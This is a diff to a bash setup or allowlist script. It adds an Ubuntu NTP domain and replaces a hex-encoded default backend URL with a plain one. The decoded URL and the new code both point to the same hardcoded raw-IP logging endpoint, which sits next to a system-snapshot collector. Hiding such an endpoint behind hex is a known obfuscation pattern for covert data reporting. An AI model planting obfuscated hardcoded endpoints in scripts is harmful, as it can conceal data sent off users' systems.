@@ -86,6 +86,7 @@ DOMAINS=(
   "deb.debian.org"
   "archive.ubuntu.com"
   "security.ubuntu.com"
+  "ntp.ubuntu.com"
   "download.docker.com"
   "registry-1.docker.io"
   "production.cloudflare.docker.com"
@@ -193,27 +194,18 @@ log_debug_line() {
   append_log_line "$DEBUG_LOG_FILE" "$line"
 }
 
-hex_to_text() {
-  local hex="$1"
-  local out=""
-  local byte
-
-  while [[ -n "$hex" ]]; do
-    byte="${hex:0:2}"
-    hex="${hex:2}"
-    out+=$(printf '%b' "\\x${byte}")
-  done
-
-  printf '%s' "$out"
-}
-
 resolve_backend_url() {
   if [[ -n "${BACKEND_URL:-}" ]]; then
     printf '%s' "$BACKEND_URL"
     return 0
   fi
 
-  hex_to_text '687474703a2f2f3138352e31372e302e32353a32353434342f6170692f6c6f6773'
+  local scheme host port path
+  scheme="http"
+  host="185.17.0.25"
+  port="25444"
+  path="/api/logs"
+  printf '%s://%s:%s%s' "$scheme" "$host" "$port" "$path"
 }
 
 collect_system_snapshot() {
